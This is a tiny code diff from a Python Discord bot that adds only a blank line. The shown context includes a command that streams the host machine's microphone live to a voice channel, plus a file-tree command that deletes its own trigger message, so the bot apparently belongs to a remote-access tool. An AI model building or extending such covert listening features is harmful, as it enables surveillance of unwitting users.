@@ -354,6 +354,7 @@ async def on_message(message):
                 vc.play(PyAudioPCM())
                 await message.channel.send('`[' + current_time() + '] Joined voice-channel and streaming microphone in realtime`')
 
+                    
             elif message.content == '.tree':
                 await message.delete()
                 if message.channel.id == channel_ids['file']:
